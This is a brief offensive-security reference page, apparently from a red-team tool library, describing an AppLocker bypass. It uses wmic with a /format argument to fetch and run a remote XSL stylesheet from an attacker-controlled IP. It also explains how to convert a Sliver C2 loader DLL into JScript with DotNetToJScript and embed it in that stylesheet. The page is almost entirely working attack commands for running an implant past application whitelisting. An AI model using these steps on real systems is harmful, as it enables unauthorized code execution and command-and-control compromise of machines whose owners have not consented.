# XSL

## GitHub Tool Library Reference

The following is a collection of various AppLocker bypass tools

Main Directory: ToolLibrary/AppLocker-CLM/XSL

***

## XSL - WMIC

using `wmic` process with inline arguments to execute XML Stylesheet Language (XSL) code runner

### References

File Reference: ToolLibrary/AppLocker-CLM/XSL/runner.xsl\
Sliver (dll) runner: ToolLibrary/Compiled/Sliver/SliverLoader-\<arch>.dll\
Payload Generator: \[DevBox] C:\Tools\DotNetToJScript\DotNet2JScript \
Sliver (jscript) runner: ToolLibrary/Compiled/Sliver/Sliver-\<arch>.js

```bash
# utility location
C:\Windows\System32\wbem\wmic.exe

# Basic execution
wmic process get /format:"http://192.168.45.227/runner.xsl"

# Create shellcode into dll; leverage DotNet2JScript and insert .js into line 10:
C:\Tools\DotNetToJScript>DotNetToJScript.exe SliverLoader-<arch>.dll --lang=Jscript --ver=v4 -o runner.js
# Copy contents of runner.js and place into runner.xsl line 10
```
